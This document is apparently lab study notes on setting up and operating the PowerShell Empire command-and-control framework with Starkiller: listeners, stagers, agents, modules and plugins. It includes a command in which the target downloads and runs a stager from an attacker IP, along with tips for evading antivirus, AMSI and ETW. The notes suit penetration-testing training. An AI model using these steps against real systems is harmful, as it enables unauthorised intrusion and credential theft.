# Powershell Empire

## Install

* Installing Empire

```
cd /opt
git clone https://github.com/BC-SECURITY/Empire/
cd /opt/Empire
./setup/install.sh
```

* Installing Starkiller
* Once Empire is installed we can install the GUI for Empire known as Starkiller.

```
cd /opt
```

* Download an up to date version of Starkiller from the BC-Security Github repo - https://github.com/BC-SECURITY/Starkiller/releases

```
chmod +x starkiller-0.0.0.AppImage
```

### Starting Empire

* Once both Empire and Starkiller are installed we can start both servers. Being by starting Empire with the instructions below.

```
cd /opt/Empire
./empire --rest
```

* Starting Starkiller
* Once Empire is started follow the instructions below to start Starkiller.

```
cd /opt
./starkiller-0.0.0.AppImage
```

### Login to Starkiller

* Default Credentials
* **Uri**: `127.0.0.1:1337`
* **User**: `empireadmin`
* **Pass**: `password123`

### Overview

* **Listeners** - Similar to Netcat or multi/handler for receiving back stagers.
* **Stagers** - Similar to a payload with further functionality for deploying agents.
* **Agents** - Used to interact with agents on the device to perform "tasks".
* **Modules** - Modules that can be used as tools or exploits.
* **Credentials** - Reports all credentials found when using modules.
* **Reporting** - A report of every module and command run on each agent.

### Server Obsfucation&#x20;

* Change `Invoke-Empire` to `Invoke-RandomStringHere` in these files:

```
empire/server/data/agent/agent.ps1
empire/server/data/agent/stagers/http/http.ps1
```

## Listeners Overview

* `http` - This is the standard listener that utilizes HTTP to listen on a specific port.
* `http_com` - Uses the standard HTTP listener with an IE COM object.
* `http_foreign` - Used to point to a different Empire server.
* `http_hop` - Used for creating an external redirector using PHP.
* `http_mapi` - Uses the standard HTTP listener with a MAPI COM object.
* The next five commands all use variations of built out services or have unique features that make them different from other listeners.
* `meterpreter` - Used to listen for Metasploit stagers.
* `onedrive` - Utilizes OneDrive as the listening platform.
* `redirector` - Used for creating pivots in a network.
* `dbx` - Utilizes Dropbox as the listening platform.
* `http_malleable` - Used alongside the malleable C2 profiles from BC-Security.

### Creating a Listener

```
CREATE LISTENER
HTTP listener
```

* Configure your listener, the only two options you will need to change are the host IP and the host port.
* HTTP listener
* **Name** - Specify what name the listener shows up as in the listener menu.
* **Host** - IP to connect back to.
* **Port** - Port to listen on.
* **BindIP** - IP to bind to (typically localhost / 0.0.0.0)
* These options can be used for specifying how the listener operates and runs when started and while running.

```
DefaultDelay
DefaultJitter
DefaultLostLimit
```

* The following options can be useful for bypassing detection techniques and creating more complex listeners.
* **DefaultProfile** - Will allow you to specify the profile used or User-Agent.
* **Headers** - Since this is an HTTP listener it will specify HTTP headers.
* **Launcher** - What launcher to use for the listener this will be prefixed on the stager.
* **Submit**

## Stagers Overview

* Starkiller uses a listener and a stager to create an agent the listener does exactly as it sounds like it, it listens on a given port for a connection back from your agent.
* The stager is similar to a payload or reverse-shell that you would send to the target to get an agent back.
* Empire has multiple parts to each stage to help identify each one. First is the platform this can include multi, OSx, and Windows. Second the stager type itself / launcher.
* Below are 3 stagers that are general purpose and can be used as your basic stagers. multi/launcher is the most all-purpose stager and can be used for a variety of scenarios, this is the stager we will use for demo purposes in this room.
* `multi/launcher` - A fairly universal stager that can be used for a variety of devices.
* `windows/launcher_bat` - Windows Batch file
* `multi/bash` - Basic Bash Stager
* You can also use stagers for more specific applications similar to the listeners. These can be anything from macro code to ducky code for USB attacks.
* `windows/ducky` - Ducky script for the USB Rubber Ducky for physical USB attacks.
* `windows/hta` - HTA server an HTML application protocol that can be used to evade AV.
* `osx/applescript` - Stager in AppleScript: Apple's own programming language.
* `osx/teensy` - Similar to the rubber ducky is a small form factor micro-controller for physical attacks.

### Generating a Stager

```
GENERATE STAGER
windows/launcher_bat
```

* Set the listener to the one you made in the previous task
* The stager menu can come with various options depending on the stager selected as well as optional fields.
* `Listener` - Select which listener to use from a list of created listeners on the Empire server.
* `Base64` - Enable or disable stager encoding with base64.
* `Language` - Language used to create the stager: bash, PowerShell, Python, etc.
* `SafeChecks` - Enable or disable checks for the stager.
* Some of the optional fields include `ASMIBypass`, `Obfuscate`, `ETWBypass`, etc.

## Transferring & Executing the Stager

* Attacking Machine:
* There are many ways that you can send the stager to the target machine including, `scp`, `phishing`, and `malware droppers`; for this example, we will use a basic `python3` server and wget to transfer the stager.

```
python3 -m http.server
```

* Target Machine:

```
wget TUN0_IP:8000/launcher.bat -outfile launcher.bat
./launcher.bat
```

## Agents Overview

* Agents are used within Starkiller similar to how you would interact with a normal shell or terminal.
* Agents are color-coded and use icons to help distinguish Agent status. Below is an outline of the color and icon scheme
* `Red` - User is no longer responding
* `Black` - User is responding normally
* `User Icon` - Normal user account
* `User Icon w/ Gear` - System user account

### Using Agents

* Below you can see the basic layout of the Agent interaction menu and what capabilities an agent on a device has.
* ![image](https://user-images.githubusercontent.com/75596877/175971748-bc49499f-4208-4f4a-a9c9-98c7828ef82f.png)

## Module Overview

* Modules are used in Empire as a way of packaging tools and exploits to be easily used with agents.
* We can take a look at a few useful ones for enumeration and privilege escalation outlined below:

```
Seatbelt
Mimikatz 
WinPEAS
```

* Empire sorts the modules by the language used: PowerShell, python, external, and exfiltration as well as categories for modules you can find the categories below.

```
code execution
collection
credentials
exfiltration
exploitation
lateral movement
management
persistence 
privesc
recon
situational awareness 
trollsploit
```

## Using Modules

* Modules require no, to very little configuration
* Below you can see the task to run Seatbelt being assigned then the output of the module being printed to the console window.
* ![image](https://user-images.githubusercontent.com/75596877/175973641-638e091d-7491-4c31-b62f-f489c1124351.png)
* Because all modules are run remotely from a task and agent this means that we do not have to worry about Anti-Virus or other possible detections.

## Plugins Overview

* Plugins are an extension of the base set of modules that Empire comes with. You can easily download and use community-made plugins to extend the use of Empire.
* To use a plugin, transfer a plugin.py file to the /plugins directory of Empire. As an example of how to use plugins, we will be using the socks server plugin made by BC-Security, you can download it here.

### Using Plugins

* Transfer or clone the plugin that you want to use into the plugins directory for Empire.
* ![image](https://user-images.githubusercontent.com/75596877/175973929-361f0f3b-61dc-45ed-9787-80437ad6ca80.png)
* After Empire version 3.4.0, Empire automatically loads plugins into the server. If the plugin is not already running you - Can use the plugin command to load the plugin for use.

```
plugin <plugin name>
```

* ![image](https://user-images.githubusercontent.com/75596877/175974111-2045b210-d083-4d18-b36a-89ef9b7fefcb.png)
* You can run plugins using the start and stop commands. Depending on the plugin the flags / parameters can change for each.

```
start <plugin name>
stop <plugin name>
```

* ![image](https://user-images.githubusercontent.com/75596877/175974240-61be75c4-b41d-4e09-aae8-bf64208331cd.png)
